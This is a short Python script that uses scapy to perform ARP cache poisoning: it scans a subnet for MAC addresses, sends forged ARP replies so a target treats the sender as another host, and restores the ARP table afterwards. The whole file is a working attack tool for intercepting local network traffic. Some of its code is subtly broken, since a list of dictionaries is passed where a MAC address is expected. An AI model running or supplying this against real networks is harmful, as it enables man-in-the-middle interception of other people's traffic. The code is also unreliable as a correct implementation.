import scapy.all as sc
import logging
logging.getLogger("scapy").setLevel(logging.CRITICAL)

def get_mac_address(ip):
    ans, unans = sc.srp(sc.Ether(dst="ff:ff:ff:ff:ff:ff")/sc.ARP(pdst=ip), timeout=2, verbose=False)

    result=[]
    for sent, received in ans:
        result.append({'IP': received.psrc, 'MAC': received.hwsrc})

    return result

def send_spoof_packet(target_ip, spoofed_ip):
    mac = get_mac_address(target_ip)
    request = sc.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
    sc.send(request)
    print(f"Spoofing {target_ip} pretending to be {spoofed_ip}")

def send_restore_packet(target_ip, source_ip):
    target_mac = get_mac_address(target_ip)
    source_mac = get_mac_address(source_ip)
    request = sc.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    sc.send(request)
    print(f"Restored {target_ip} table")

print(get_mac_address("192.168.1.0/16"))